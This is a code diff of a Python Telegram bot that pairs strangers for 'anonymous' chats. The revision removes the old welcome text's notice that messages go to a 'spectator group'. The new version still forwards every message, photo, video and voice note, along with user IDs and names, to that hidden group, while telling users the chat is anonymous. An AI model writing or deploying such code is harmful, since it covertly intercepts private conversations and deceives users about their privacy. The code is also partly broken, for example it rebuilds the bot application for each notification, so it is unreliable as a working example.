@@ -1,221 +1,190 @@
 import os
 import logging
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatAction
-from telegram.ext import (
-    Application, CommandHandler, ContextTypes,
-    MessageHandler, CallbackQueryHandler, filters, ConversationHandler
+from telegram import (
+    Update,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup
 )
-from telegram.error import Forbidden, BadRequest, TimedOut
-import asyncio
+from telegram.constants import ChatAction
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    CallbackQueryHandler,
+    MessageHandler,
+    ContextTypes,
+    filters
+)
+from collections import deque
 
-logging.basicConfig(level=logging.INFO)
+# -------------------- CONFIGURATION --------------------
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+SPECTATOR_GROUP_ID = os.environ.get("SPECTATOR_GROUP_ID")
+ADMIN_IDS = [int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
+
+if not BOT_TOKEN or not SPECTATOR_GROUP_ID:
+    raise ValueError("BOT_TOKEN and SPECTATOR_GROUP_ID must be set as environment variables!")
+
+# -------------------- LOGGING --------------------
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO
+)
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
-SPECTATOR_GROUP_ID = os.getenv("SPECTATOR_GROUP_ID")  # REQUIRED: keep surveillance intact
+# -------------------- IN-MEMORY STORAGE --------------------
+waiting_users = deque()  # Queue of users waiting for a chat
+active_chats = {}        # {user_id: partner_id}
 
-# Simple in-memory structures. For production, swap to DB (Redis/Postgres) to persist across restarts.
-waiting_users = []
-active_chats = {}  # user_id -> partner_id
-user_settings = {}  # user_id -> dict with preferences (reserved for future use)
+# -------------------- INLINE BUTTONS --------------------
+def main_menu_buttons():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔍 Find Partner", callback_data="find_partner")],
+        [InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
+         InlineKeyboardButton("ℹ️ Help", callback_data="help")]
+    ])
 
-# States for ConversationHandler (not strictly required but kept for clarity)
-MENU = range(1)
-
-def main_menu_keyboard():
-    keyboard = [
-        [InlineKeyboardButton("🔎 Find Partner", callback_data="find")],
+def chat_buttons():
+    return InlineKeyboardMarkup([
         [InlineKeyboardButton("⏭ Next", callback_data="next")],
-        [InlineKeyboardButton("🚩 Report", callback_data="report")],
-        [InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
-        [InlineKeyboardButton("❓ Help", callback_data="help")],
-    ]
-    return InlineKeyboardMarkup(keyboard)
+        [InlineKeyboardButton("🚫 End Chat", callback_data="end"),
+         InlineKeyboardButton("⚠ Report", callback_data="report")]
+    ])
 
-async def safe_send_spectator(context: ContextTypes.DEFAULT_TYPE, msg: str):
-    if not SPECTATOR_GROUP_ID:
-        return
-    try:
-        await context.bot.send_message(int(SPECTATOR_GROUP_ID), msg)
-    except Exception as e:
-        logger.warning(f"Spectator send error: {e}")
-
+# -------------------- CORE FUNCTIONS --------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = main_menu_keyboard()
-    text = (
-        "👋 Welcome to *Improved Anonymous Chat*! \n\n"
-        "Tap *Find Partner* to connect with a random user. You can always use the buttons shown during chat:\n"
-        "• ⏭ Next — skip to another partner\n• 🚩 Report — report abusive users\n• 🛑 End — end current chat\n\n"
-        "Privacy note: This bot has an approved surveillance forwarding system to a spectator group maintained by authorities. "
-        "Do not share illegal content."
+    user = update.effective_user
+    logger.info(f"/start from {user.id} - {user.first_name}")
+    await update.message.reply_text(
+        f"👋 Hi {user.first_name}! Welcome to Anonymous Chat Bot.\n\n"
+        "You can chat with random people anonymously.\n\n"
+        "Choose an option below to get started:",
+        reply_markup=main_menu_buttons()
     )
-    await update.message.reply_markdown_v2(text, reply_markup=keyboard)
+    await notify_spectator(f"User {user.id} ({user.first_name}) started the bot.")
 
+async def find_partner(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id=None):
+    if not user_id:
+        user_id = update.effective_user.id
+
+    if user_id in active_chats:
+        await context.bot.send_message(user_id, "⚠ You are already in a chat!", reply_markup=chat_buttons())
+        return
+
+    if user_id in waiting_users:
+        await context.bot.send_message(user_id, "⌛ You're already waiting for a partner...")
+        return
+
+    # Match with someone if available
+    if waiting_users:
+        partner_id = waiting_users.popleft()
+        active_chats[user_id] = partner_id
+        active_chats[partner_id] = user_id
+
+        await context.bot.send_message(user_id, "✅ Partner found! Say hi 👋", reply_markup=chat_buttons())
+        await context.bot.send_message(partner_id, "✅ Partner found! Say hi 👋", reply_markup=chat_buttons())
+
+        await notify_spectator(f"New chat started between {user_id} and {partner_id}")
+    else:
+        waiting_users.append(user_id)
+        await context.bot.send_message(user_id, "⌛ Waiting for a partner...")
+
+async def end_chat(user_id, context):
+    """End chat for a given user."""
+    if user_id not in active_chats:
+        return
+
+    partner_id = active_chats.pop(user_id, None)
+    if partner_id and partner_id in active_chats:
+        active_chats.pop(partner_id, None)
+        await context.bot.send_message(partner_id, "❌ Your partner ended the chat.", reply_markup=main_menu_buttons())
+
+    await context.bot.send_message(user_id, "❌ Chat ended.", reply_markup=main_menu_buttons())
+    await notify_spectator(f"Chat ended by {user_id}")
+
+async def report_user(user_id, context):
+    """Report the partner and notify spectator group."""
+    if user_id not in active_chats:
+        await context.bot.send_message(user_id, "⚠ You're not in a chat to report someone.")
+        return
+
+    partner_id = active_chats.get(user_id)
+    if partner_id:
+        await context.bot.send_message(user_id, "⚠ You reported your partner. Thank you for keeping the community safe.")
+        await notify_spectator(f"🚨 REPORT: User {user_id} reported {partner_id}")
+
+async def notify_spectator(message: str):
+    """Send message to surveillance group."""
+    from telegram.ext import Application
+    # Application singleton isn't available in async handlers directly, so use bot from context
+    try:
+        app = ApplicationBuilder().token(BOT_TOKEN).build()
+        await app.bot.send_message(chat_id=SPECTATOR_GROUP_ID, text=message)
+    except Exception as e:
+        logger.error(f"Failed to notify spectator group: {e}")
+
+# -------------------- MESSAGE HANDLING --------------------
+async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Relay messages between users and to spectator group."""
+    user_id = update.effective_user.id
+    if user_id not in active_chats:
+        await update.message.reply_text("⚠ You're not in a chat. Use /start to begin.")
+        return
+
+    partner_id = active_chats[user_id]
+    try:
+        # Show typing indicator
+        await context.bot.send_chat_action(partner_id, ChatAction.TYPING)
+        await update.message.copy(chat_id=partner_id)
+    except Exception as e:
+        logger.error(f"Failed to send message to partner: {e}")
+
+    # Forward to surveillance group
+    try:
+        await update.message.forward(chat_id=SPECTATOR_GROUP_ID)
+    except Exception as e:
+        logger.error(f"Failed to forward to spectator group: {e}")
+
+# -------------------- CALLBACK HANDLER --------------------
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     user_id = query.from_user.id
-    data = query.data
 
-    if data == "find":
-        await handle_find(query, context, user_id)
-    elif data == "next":
-        await handle_next(query, context, user_id)
-    elif data == "report":
-        await handle_report(query, context, user_id)
-    elif data == "settings":
-        await query.edit_message_text("⚙️ Settings are coming soon. For now, no preferences are required.", reply_markup=main_menu_keyboard())
-    elif data == "help":
-        await query.edit_message_text("❓ Help:\\nUse *Find Partner* to start. During chat, use the inline buttons to End, Report or Next.", reply_markup=main_menu_keyboard())
-    elif data == "end_chat":
-        await end_chat_by_user(user_id, context, reason="ended_via_button")
-    else:
-        await query.edit_message_text("Unknown action. Please try again.", reply_markup=main_menu_keyboard())
+    if query.data == "find_partner":
+        await find_partner(update, context, user_id)
 
-async def handle_find(query, context, user_id):
-    # if already chatting, notify
-    if user_id in active_chats:
-        await query.edit_message_text("⚠️ You're already connected. Use the buttons below to End or Next.", reply_markup=chat_controls_markup())
-        return
+    elif query.data == "next":
+        await end_chat(user_id, context)
+        await find_partner(update, context, user_id)
 
-    # add to waiting list if not present
-    if user_id in waiting_users:
-        await query.edit_message_text("🔁 You're already searching. Please wait...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⏭ Next", callback_data="next"), InlineKeyboardButton("❌ Cancel", callback_data="cancel_find")]]))
-        return
+    elif query.data == "end":
+        await end_chat(user_id, context)
 
-    # try to match with someone waiting
-    if waiting_users:
-        partner = None
-        # pop first user that's not this user
-        while waiting_users:
-            cand = waiting_users.pop(0)
-            if cand != user_id and cand not in active_chats:
-                partner = cand
-                break
-        if partner:
-            # create active chat
-            active_chats[user_id] = partner
-            active_chats[partner] = user_id
-            # notify both users
-            try:
-                await context.bot.send_message(user_id, "🤝 You are now connected! Say hi. Use buttons below to control chat.", reply_markup=chat_controls_markup())
-                await context.bot.send_message(partner, "🤝 You are now connected! Say hi. Use buttons below to control chat.", reply_markup=chat_controls_markup())
-                await safe_send_spectator(context, f"👁 New connection: {user_id} ↔ {partner}")
-            except Exception as e:
-                logger.warning(f"Connection notify error: {e}")
-                # cleanup on error
-                active_chats.pop(user_id, None)
-                active_chats.pop(partner, None)
-                await query.edit_message_text("Could not connect right now. Please try again.")
-                return
-            await query.edit_message_text("✅ Connected! Check your chat.", reply_markup=None)
-            return
+    elif query.data == "report":
+        await report_user(user_id, context)
 
-    # otherwise add to waiting queue
-    waiting_users.append(user_id)
-    await query.edit_message_text("🔎 Searching for a partner... You can cancel from the menu.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_find")]]))
+    elif query.data == "settings":
+        await query.message.reply_text("⚙️ Settings coming soon!")
 
-async def handle_next(query, context, user_id):
-    # If in active chat, end current and re-enter search
-    if user_id in active_chats:
-        partner = active_chats.pop(user_id)
-        active_chats.pop(partner, None)
-        try:
-            await context.bot.send_message(partner, "🛑 Your partner left the chat.", reply_markup=main_menu_keyboard())
-            await safe_send_spectator(context, f"🚪 User {user_id} ended chat with User {partner} (next)")
-        except Exception as e:
-            logger.warning(f"Next notify error: {e}")
-    # start search again
-    await handle_find(query, context, user_id)
+    elif query.data == "help":
+        await query.message.reply_text("ℹ️ Help:\n\n1. Use 'Find Partner' to connect.\n2. Use 'Next' to skip.\n3. 'Report' if someone violates rules.")
 
-async def handle_report(query, context, user_id):
-    # If in active chat, report partner; else report last partner or no partner
-    partner = active_chats.get(user_id)
-    if not partner:
-        await query.edit_message_text("⚠️ You are not currently in a chat. There's no one to report.", reply_markup=main_menu_keyboard())
-        return
-    # notify admins / spectator group with full details (maintain surveillance)
-    msg = f"🚨 Report from {user_id} against {partner}"
-    await safe_send_spectator(context, msg)
-    # optionally inform the partner and end chat
-    await context.bot.send_message(partner, "⚠️ You have been reported. The chat will end.", reply_markup=main_menu_keyboard())
-    await context.bot.send_message(user_id, "✅ Thank you. The report has been sent to moderators.", reply_markup=main_menu_keyboard())
-    # end chat
-    await end_chat_between(user_id, partner, context, reported=True)
+# -------------------- RUN BOT --------------------
+def run_bot():
+    """Start the bot and run polling."""
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
 
-async def chat_controls_markup():
-    keyboard = [
-        [InlineKeyboardButton("⏭ Next", callback_data="next"), InlineKeyboardButton("🛑 End", callback_data="end_chat")],
-        [InlineKeyboardButton("🚩 Report", callback_data="report"), InlineKeyboardButton("🏠 Menu", callback_data="menu")]
-    ]
-    return InlineKeyboardMarkup(keyboard)
+    # Command handlers
+    application.add_handler(CommandHandler("start", start))
 
-async def end_chat_by_user(user_id, context, reason="ended"):
-    partner = active_chats.pop(user_id, None)
-    if partner:
-        active_chats.pop(partner, None)
-        try:
-            await context.bot.send_message(partner, "🛑 Your partner left the chat.", reply_markup=main_menu_keyboard())
-            await context.bot.send_message(user_id, "You left the chat.", reply_markup=main_menu_keyboard())
-            await safe_send_spectator(context, f"🚪 User {user_id} ended chat with User {partner} (reason: {reason})")
-        except Exception as e:
-            logger.warning(f"End chat notify error: {e}")
+    # Button presses
+    application.add_handler(CallbackQueryHandler(button_handler))
 
-async def end_chat_between(u1, u2, context, reported=False):
-    active_chats.pop(u1, None)
-    active_chats.pop(u2, None)
-    try:
-        await context.bot.send_message(u1, "🛑 Chat ended.", reply_markup=main_menu_keyboard())
-        await context.bot.send_message(u2, "🛑 Chat ended.", reply_markup=main_menu_keyboard())
-        await safe_send_spectator(context, f"🛑 Chat ended between {u1} & {u2}. Reported={reported}")
-    except Exception as e:
-        logger.warning(f"End chat between notify error: {e}")
+    # Message forwarding
+    application.add_handler(MessageHandler(filters.TEXT | filters.PHOTO | filters.VIDEO | filters.AUDIO | filters.VOICE, message_handler))
 
-async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    # if user is in active chat, forward message to partner and to spectator group (surveillance)
-    if user_id in active_chats:
-        partner = active_chats[user_id]
-        try:
-            # copy message to partner preserving media and formatting
-            await context.bot.copy_message(chat_id=partner, from_chat_id=update.effective_chat.id, message_id=update.message.message_id)
-            # send preview to spectator group
-            if SPECTATOR_GROUP_ID:
-                text_preview = update.message.text or "[non-text message]"
-                await context.bot.send_message(int(SPECTATOR_GROUP_ID), f"👁 {user_id} → {partner}\\n💬 {text_preview}")
-        except (Forbidden, BadRequest, TimedOut) as e:
-            logger.warning(f"Message forward error: {e}")
-        return
+    logger.info("Bot is polling...")
+    application.run_polling()
 
-    # if user is not in chat and sends "menu" messages, show menu
-    if update.message.text and update.message.text.lower() in ("menu", "/menu", "back"):
-        await update.message.reply_text("🏠 Main menu", reply_markup=main_menu_keyboard())
-        return
-
-    # otherwise prompt user to start search
-    await update.message.reply_text("You are not connected. Use the menu to Find a partner.", reply_markup=main_menu_keyboard())
-
-async def getid(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat = update.effective_chat
-    await update.message.reply_text(f"📌 This chat ID is: `{chat.id}`")
-
-async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Sorry, I didn't understand that command. Use the menu.", reply_markup=main_menu_keyboard())
-
-def build_app():
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("getid", getid))
-    app.add_handler(CallbackQueryHandler(button_handler))
-    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, message_handler))
-    return app
-
-def main():
-    # Entry point for running locally or via subprocess
-    app = build_app()
-    logger.info("Improved bot starting...")
-    app.run_polling()
-
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":
+    run_bot()
